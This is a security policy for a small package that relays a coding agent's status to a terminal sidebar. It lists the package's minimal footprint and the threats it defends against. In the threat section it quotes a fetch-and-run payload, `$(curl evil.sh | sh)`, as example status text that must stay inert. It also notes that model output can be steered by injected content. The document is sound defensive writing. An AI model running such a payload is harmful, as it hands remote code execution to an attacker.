# Security

This package runs inside a coding agent — a process that holds provider API
keys, reads your source tree and can execute shell commands. A status reporter
is a small thing to put in that position, which is exactly why it should be
possible to read all of it in one sitting.

## What it does and does not touch

| | |
|---|---|
| Runtime dependencies | none |
| Network calls | none |
| Filesystem writes | none |
| Files read | none, beyond `stat` on the herdr binary |
| Environment read | `HERDR_ENV`, `HERDR_PANE_ID`, `HERDR_BIN_PATH` only |
| Install scripts | none |
| Child processes | the validated herdr binary, argv array, no shell |

It never reads a credential, so it cannot leak one. It has no network path, so
it could not exfiltrate one if it did.

## Threats considered

**Command injection through status text.** An agent's status message is model
output, and model output is attacker-influenced whenever the model has read a
file, a web page or an issue tracker. A message like
`` $(curl evil.sh | sh) `` must stay inert. Every call uses `spawn` with an argv
array and `shell: false`, so arguments never reach a shell parser. A test
asserts this with a real metacharacter payload and checks that the side effect
did not happen.

**Hijacking the reporter to run something else.** `HERDR_BIN_PATH` comes from
the environment. If it were used unchecked, anything able to set an environment
variable — a `.envrc`, a compromised dependency in the host, a poisoned CI step
— would gain code execution on every state change. The path must be absolute,
must resolve to an existing regular file, and must be executable. Anything else
disables the bridge instead of running it.

**Terminal escape sequences in the sidebar.** Status text is rendered in a TUI.
Control characters are stripped and the message is capped at 200 characters, so
a long or crafted string cannot redraw the interface or hide what a pane is
doing.

**State confusion from out-of-order reports.** Every report carries a
monotonically increasing sequence number, so a slow call cannot land after a
newer one and leave a pane showing a state it has already left.

**Taking down its host.** A reporter that throws inside a turn is worse than no
reporter. Spawn failures, missing events and a herdr server that is not running
all resolve to `false`. The only thrown error is a programming mistake in the
caller: an invalid state name, rejected before anything is spawned.

**Panes stuck as `working` forever.** Exit, `SIGINT`, `SIGTERM` and `SIGHUP`
all release pane authority, so a killed agent does not sit in the sidebar
claiming to be busy.

## What is out of scope

The bridge reports state. It does not read agent output, does not touch
sessions or transcripts, and does not use Herdr's socket API — the CLI surface
is narrower and easier to audit. If a future feature needs the socket, it
belongs in a separate package with its own review.

It also cannot make an unsafe agent safe. What the agent itself is allowed to
do — write files, run commands, reach the network — is governed by that agent's
own permission model, not by this.

## Reporting a problem

Open an issue. If it is sensitive, say so without details and a private channel
will be arranged.
